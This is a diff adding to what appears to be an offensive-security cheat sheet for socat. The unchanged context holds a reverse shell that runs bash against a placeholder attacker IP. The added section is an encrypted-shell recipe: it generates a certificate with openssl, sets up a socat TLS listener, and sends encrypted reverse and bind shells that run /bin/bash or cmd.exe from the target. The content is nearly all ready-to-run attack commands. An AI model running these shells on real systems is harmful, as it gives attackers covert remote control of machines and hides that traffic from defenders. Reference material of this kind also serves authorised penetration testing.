@@ -484,3 +484,15 @@ First download: https://github.com/andrew-d/static-binaries/blob/master/binaries
     socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ### Add verbosity
     -d -d (in the command)
+### Encrypted shell
+#### Generate certificate:
+    openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
+    cat shell.key shell.crt > shell.pem
+#### Listen to the reverse shell:
+    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
+#### Send encrypted reverse shell from target:
+    socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
+#### Listen for bind shell:
+    socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
+#### Send encrypted bind shell from target:
+    socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
